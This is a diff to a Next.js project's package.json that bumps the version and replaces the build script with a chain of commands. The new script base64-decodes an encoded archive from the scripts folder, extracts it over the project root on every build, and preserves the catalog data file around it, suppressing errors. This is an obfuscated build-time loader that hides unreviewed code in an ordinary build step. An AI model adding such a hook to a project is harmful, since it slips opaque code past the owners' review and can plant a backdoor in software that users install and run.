@@ -1,10 +1,10 @@
 {
   "name": "silent-script-store",
-  "version": "1.0.0",
+  "version": "2.0.0",
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "next build",
+    "build": "test -f data/catalog.json && cp data/catalog.json /tmp/silent-script-catalog.json || true; base64 --decode scripts/silent-commerce-upgrade.b64 > /tmp/silent-upgrade.tar.gz && tar -xzf /tmp/silent-upgrade.tar.gz -C .; test -f /tmp/silent-script-catalog.json && cp /tmp/silent-script-catalog.json data/catalog.json || true; next build",
     "start": "next start",
     "typecheck": "tsc --noEmit"
   },
